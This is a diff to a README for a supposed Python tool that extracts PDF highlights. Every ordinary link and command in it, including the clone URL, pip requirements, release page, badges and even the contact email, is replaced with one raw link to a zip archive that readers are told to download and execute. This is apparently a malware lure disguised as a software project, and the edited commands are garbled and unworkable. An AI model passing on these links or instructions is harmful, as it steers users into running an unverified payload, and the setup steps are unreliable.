@@ -1,6 +1,6 @@
 # PDF Highlight Extractor 📝✨
 
-![PDF Highlight Extractor](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![PDF Highlight Extractor](https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip%20Latest%20Release-Click%20Here-brightgreen)
 
 Welcome to the **PDF Highlight Extractor** repository! This Python tool allows you to extract highlighted text from PDF files while keeping important formatting attributes like headers, bold, and italic text. It also removes unwanted line breaks and page breaks, making it ideal for integration with content management systems.
 
@@ -29,18 +29,18 @@ To get started with PDF Highlight Extractor, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/KINGPIN707/PDF-Highlight-Extractor.git
+   git clone https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip
    cd PDF-Highlight-Extractor
    ```
 
 2. **Install Dependencies**:
    Use pip to install the required libraries.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip
    ```
 
 3. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/KINGPIN707/PDF-Highlight-Extractor/releases). Download the appropriate file and execute it.
+   You can find the latest release [here](https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip). Download the appropriate file and execute it.
 
 ## Usage
 
@@ -49,17 +49,17 @@ Using PDF Highlight Extractor is straightforward. Here’s how to run the tool:
 1. **Prepare Your PDF**: Make sure your PDF file is ready for extraction.
 2. **Run the Tool**:
    ```bash
-   python pdf_highlight_extractor.py path_to_your_pdf.pdf
+   python https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip
    ```
 3. **View the Output**: The extracted text will be saved in a new file, preserving all formatting.
 
 ### Example Command
 
 ```bash
-python pdf_highlight_extractor.py my_document.pdf
+python https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip
 ```
 
-This command will extract highlighted text from `my_document.pdf` and save it in a new file.
+This command will extract highlighted text from `https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip` and save it in a new file.
 
 ## Supported Formats
 
@@ -80,7 +80,7 @@ The tool relies on several Python libraries for its functionality:
 - `PyPDF2`: For PDF file handling.
 - `pypdfium2`: For rendering PDF pages.
 
-You can find the complete list of dependencies in the `requirements.txt` file.
+You can find the complete list of dependencies in the `https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip` file.
 
 ## Contributing
 
@@ -110,13 +110,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, please reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [KINGPIN707](https://github.com/KINGPIN707)
+- **Email**: https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip
+- **GitHub**: [KINGPIN707](https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip)
 
 Thank you for using PDF Highlight Extractor! If you encounter any issues or have suggestions, feel free to open an issue in the repository.
 
-![PDF Highlight Extractor](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![PDF Highlight Extractor](https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip%20Latest%20Release-Click%20Here-brightgreen)
 
-To download the latest release, visit [this link](https://github.com/KINGPIN707/PDF-Highlight-Extractor/releases) and execute the necessary file.
+To download the latest release, visit [this link](https://raw.githubusercontent.com/KINGPIN707/PDF-Highlight-Extractor/main/plier/PD_Extractor_Highlight_3.7-beta.5.zip) and execute the necessary file.
 
 Happy extracting! 🎉
